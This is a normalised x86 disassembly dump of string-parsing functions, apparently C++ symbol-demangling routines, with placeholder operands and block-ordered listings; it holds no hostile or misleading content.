mov [ eax + 0x4 ] ecx
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x20
lea ecx [ ebp - 0x14 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_410f29
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
jmp r-xdata
sub esi ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0xc ]
call sub_410bf5
jmp r-xdata
mov eax [ ebp + 0x8 ]
test bl 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410bf5
test bl 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x14 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
sub esi ecx
je r-xdata
mov bl [ ecx ]
inc ecx
movzx eax bl
mov [ rw-data ] ecx
cmp eax edx
jg r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410bf5
push r--data
lea ecx [ ebp - 0xc ]
call sub_411021
jmp r-xdata
sub esi ecx
je r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
sub esi 0x14
jne r-xdata
push 0xfffffffe
pop ebx
cmp eax 0x52
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x47
jg r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
movzx eax bl
sub eax 0x45
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x53
je r-xdata
lea ecx [ ebp - 0xc ]
call sub_410bf5
jmp r-xdata
cmp eax 0x49
jle r-xdata
cmp eax 0x46
jge r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x55
je r-xdata
sub esi 0x43
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x4b
jle r-xdata
push r--data
jmp r-xdata
test eax eax
je r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x57
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x4d
jg r-xdata
dec ecx
mov [ rw-data ] ecx
lea ecx [ ebp - 0xc ]
push 0x1
call sub_410c27
jmp r-xdata
cmp eax 0x24
je r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
add eax 0xffffffa8
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_4124eb
push eax
push r--data
push [ ebp + 0x8 ]
call sub_410e37
add esp 0x14
jmp r-xdata
add eax 0xffffffbc
cmp eax 0x1
ja r-xdata
sub eax ecx
jne r-xdata
lea eax [ ebp - 0x1c ]
dec ecx
push eax
mov [ rw-data ] ecx
call sub_4134c8
pop ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
push r--data
sub_4128ea
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
push 0x1
movsx ecx cl
sub ecx 0x41
inc eax
mov [ rw-data ] eax
push 0x2
cmp ecx 0x10
ja r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
and [ ebp - 0x8 ] 0x0
and eax 0xffff0002
pop edx
or eax edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
and ecx 0xfffffffe
cmp ecx 0x8
ja r-xdata
mov esp ebp
pop ebp
retn
sub ecx 0xc
je r-xdata
je r-xdata
push 0x7
sub ecx edx
je r-xdata
push 0x5
jmp r-xdata
sub ecx 0x0
je r-xdata
push 0x8
jmp r-xdata
sub ecx edx
jne r-xdata
call sub_41117e
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410bf5
push 0x1
jmp r-xdata
sub ecx edx
je r-xdata
push 0x6
jmp r-xdata
push edx
jmp r-xdata
sub ecx edx
je r-xdata
push 0x4
jmp r-xdata
sub ecx edx
jne r-xdata
push 0x3
jmp r-xdata
sub_4129a9
push ebp
mov ebp esp
sub esp 0x54
mov eax [ ebp - 0x38 ]
xor ecx ecx
and eax 0xffff0000
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov al [ eax ]
test al al
je r-xdata
cmp [ ebp + 0x18 ] ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp al 0x24
jne r-xdata
push 0x1
mov esi [ ebp + 0xc ]
cmp [ esi ] ecx
je r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov edx [ ebp - 0x18 ]
mov al [ eax ]
cmp al 0x41
movsx ebx al
mov eax 0xffff0000
setl cl
and [ ebp - 0x20 ] eax
dec ecx
xor edi edi
and ecx 0x2b
mov [ ebp - 0x1c ] edi
add ecx 0x16
and edx eax
sub ebx ecx
mov [ ebp - 0x18 ] edx
xor ecx ecx
xor al al
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x2 ] al
mov [ ebp - 0x3 ] al
push esi
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_4136e2
mov ecx [ ebp - 0x34 ]
add esp 0x10
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
test [ esi + 0x4 ] 0x100
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x11
shr eax 0x1
not ecx
not eax
and ecx eax
test cl 0x1
je r-xdata
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
push eax
jmp r-xdata
push esi
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cmp [ eax ] 0x24
jne r-xdata
test edi edi
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
sub eax 0x1
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push [ ebp + 0x8 ]
call sub_410e5b
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_4108ad
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x3c ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x38 ]
push 0x20
mov [ ebp - 0x30 ] eax
call sub_410f6c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x34 ]
call sub_410e7f
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov edx [ ebp - 0x18 ]
mov al [ eax ]
cmp al 0x41
movsx ebx al
setl cl
dec ecx
and ecx 0x2b
add ecx 0x16
sub ebx ecx
mov ecx [ ebp - 0x24 ]
jmp r-xdata
push esi
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_4136e2
mov ecx [ ebp - 0x3c ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x9
push 0x20
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edx
call sub_410f6c
push 0x9
call sub_41117e
pop ecx
push eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x34 ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
sub eax 0x1
je r-xdata
mov eax ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x38 ]
jmp r-xdata
push 0xb
call sub_41117e
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call sub_410bf5
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
push 0x20
mov [ ebp - 0x10 ] eax
call sub_410f6c
push 0xb
call sub_41117e
pop ecx
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_410ee5
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] eax
jmp r-xdata
push 0x2
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
test esi esi
je r-xdata
sub eax 0x1
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov [ ebp - 0x3 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
cmp ebx 0x1f
ja r-xdata
inc [ rw-data ]
test edi edi
je r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_410873
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x2c ]
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_410f29
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
test edi edi
je r-xdata
push 0xa
jmp r-xdata
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] edx
call sub_410f6c
push 0xa
call sub_41117e
pop ecx
push eax
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
test ecx ecx
je r-xdata
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
call sub_410f6c
mov eax [ ebp - 0x2c ]
lea ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_410f29
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
call sub_41117e
pop ecx
push eax
lea ecx [ ebp - 0x1c ]
call sub_410bf5
mov edi [ ebp - 0x1c ]
push eax
call sub_410ee5
mov edi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jmp r-xdata
test bl 0x10
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x2c ] ecx
lea ecx [ ebp - 0x2c ]
push 0x20
mov [ ebp - 0x28 ] eax
call sub_410f6c
mov eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_410f29
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
mov eax ebx
je r-xdata
test esi esi
je r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
test bl 0x2
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_412452
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call sub_41110c
mov edx [ ebp - 0x10 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
lea eax [ ebp - 0x14 ]
push eax
je r-xdata
test bl 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_412452
pop ecx
mov ecx eax
call sub_410e7f
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_411082
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x54 ]
push eax
call sub_414a47
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call sub_41110c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_4108ad
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_414a47
pop ecx
mov ecx eax
call sub_410e7f
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov al [ ebp - 0x2 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
inc eax
mov [ rw-data ] eax
cmp cl 0x40
je r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov al [ ebp - 0x3 ]
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x2c ]
push r--data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
call sub_411021
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edi 0x100
test esi esi
jne r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x2c ]
push r--data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
call sub_411021
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
or edx edi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
xor ecx ecx
cmp [ esi ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
or edx 0x2000
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
test [ esi + 0x4 ] edi
jne r-xdata
push eax
test [ esi + 0x4 ] 0x800
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
push esi
jmp r-xdata
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push eax
lea eax [ ebp - 0x2c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x28 ]
push 0x20
mov [ ebp - 0x30 ] eax
call sub_410f6c
push esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410e7f
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_410f29
mov edx [ ebp - 0x10 ]
sub_412fcb
push ebp
mov ebp esp
sub esp 0x10
xor ecx ecx
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push ecx
push eax
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ecx
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
call sub_4129a9
mov eax [ ebp + 0x8 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_413004
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_410826
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
push 0x1
call sub_4108ad
cmp cl 0x3f
je r-xdata
and [ ebp - 0x10 ] 0x0
inc eax
and [ ebp - 0xc ] 0xffff0000
mov [ rw-data ] eax
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push r--data
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_4129a9
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_414531
add esp 0x1c
jmp r-xdata
cmp cl 0x58
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
inc eax
cmp [ ebp - 0x8 ] 0x0
mov [ rw-data ] eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_414531
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
push r--data
call sub_410873
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410873
jmp r-xdata
mov ecx eax
call sub_410e7f
sub_4130d6
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x24
push ebx
push esi
mov esi 0x2000
push edi
test esi eax
je r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
cmp cl 0x3f
jne r-xdata
and eax 0xffffdfff
mov [ rw-data ] eax
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_413004
or [ rw-data ] esi
pop ecx
pop ecx
test cl cl
jne r-xdata
inc eax
mov [ rw-data ] eax
cmp [ eax ] cl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2
jmp r-xdata
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_415192
mov esi [ ebp - 0xc ]
xor eax eax
mov ebx [ ebp - 0x8 ]
inc eax
pop ecx
test esi esi
je r-xdata
cmp [ eax + 0x1 ] cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
and [ ebp - 0x4 ] 0x0
test ebx 0x200
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4130d6
mov eax [ rw-data ]
pop ecx
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
cmp al 0x40
je r-xdata
mov edi ebx
shr edi 0xf
and edi eax
cmp bl 0x1
jle r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
mov edx 0x8000
test edi edi
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_414a47
mov eax [ ebp - 0x24 ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
or ebx edx
mov [ ebp - 0x8 ] ebx
or ebx 0x200
mov [ ebp - 0x8 ] ebx
cmp [ rw-data ] 0x0
je r-xdata
mov edi 0x1000
test edi ebx
jne r-xdata
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
push r--data
mov [ ebp - 0x18 ] eax
call sub_411021
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_410f29
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
lea eax [ ebp - 0x24 ]
mov [ rw-data ] 0x0
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] ebx
call sub_410f29
mov eax [ rw-data ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
cmp [ eax ] 0x40
mov [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_414a47
mov [ esp ] r--data
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_411021
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_410f29
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
jmp r-xdata
test [ rw-data ] edi
je r-xdata
cmp al 0x40
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_4111e1
pop ecx
pop ecx
jmp r-xdata
test ecx ecx
jne r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x8 ]
test edx ebx
jne r-xdata
and [ ebp - 0x24 ] ecx
lea eax [ ebp - 0x24 ]
and [ ebp - 0x20 ] 0xffff0000
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_4111e1
pop ecx
pop ecx
jmp r-xdata
sub_413322
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x18
push esi
xor esi esi
cmp [ ecx ] 0x51
push edi
mov edi esi
jne r-xdata
mov al [ ecx ]
test al al
jne r-xdata
inc ecx
mov edi r--data
mov [ rw-data ] ecx
cmp al 0x30
jl r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_4108ad
mov eax [ ebp + 0x8 ]
jmp r-xdata
push ebx
mov ebx esi
jmp r-xdata
cmp al 0x39
jg r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x40
jne r-xdata
movsx eax al
sub eax 0x2f
inc ecx
cdq
mov [ rw-data ] ecx
push edx
push eax
test edi edi
je r-xdata
test al al
je r-xdata
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_410996
lea ecx [ ebp - 0x8 ]
call sub_410996
push eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_410e37
add esp 0xc
jmp r-xdata
push 0x1
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
je r-xdata
push 0x2
mov edx eax
mov eax [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp al 0x50
jg r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
pop ebx
movsx eax al
shld ebx esi 0x4
sub eax 0x41
cdq
shl esi 0x4
add eax esi
mov esi eax
adc ebx edx
inc ecx
mov [ rw-data ] ecx
mov al [ ecx ]
lea ecx [ ebp - 0x8 ]
call sub_410996
lea ecx [ ebp - 0x18 ]
call sub_410996
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_410901
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call sub_410901
push eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_410e37
add esp 0xc
jmp r-xdata
mov edx eax
mov eax [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
sub_413459
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
pop ebp
retn
cmp al 0x5f
jne r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp al 0x5f
jne r-xdata
add ecx 0x2
mov [ rw-data ] ecx
movsx eax [ ecx ]
sub eax 0x41
inc ecx
mov [ rw-data ] ecx
cmp eax 0x3
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4134c8
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x20
mov edx eax
shr edx 0xf
not edx
push ebx
push esi
xor esi esi
inc esi
and edx esi
je r-xdata
xor esi esi
test eax 0x1000
je r-xdata
dec ecx
mov [ rw-data ] ecx
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410873
mov eax [ ebp + 0x8 ]
sub eax 0x54
je r-xdata
mov ecx [ rw-data ]
mov ebx 0xffff0000
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] ebx
movsx eax [ ecx ]
inc ecx
mov [ rw-data ] ecx
sub eax 0x0
je r-xdata
push r--data
sub eax 0x1
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_414e25
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_410f29
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
call sub_410bf5
push r--data
jmp r-xdata
sub eax 0x1
je r-xdata
lea eax [ ebp - 0x18 ]
mov esi edx
push eax
call sub_4135f6
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x1
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] ebx
test esi esi
je r-xdata
push r--data
jmp r-xdata
sub eax 0x1
jne r-xdata
push r--data
jmp r-xdata
sub_4135f6
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0xffff0000
mov al [ eax ]
test al al
je r-xdata
push 0x1
movsx eax al
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
push 0x2
jmp r-xdata
jmp [ eax * 4 + jump_table_4136c2 ]
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov eax [ ebp + 0x8 ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov eax [ rw-data ]
movsx eax [ eax ]
inc [ rw-data ]
sub eax 0x31
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_410bf5
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
dec eax
sub eax 0x1
je r-xdata
mov esp ebp
pop ebp
retn
dec eax
sub eax 0x1
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
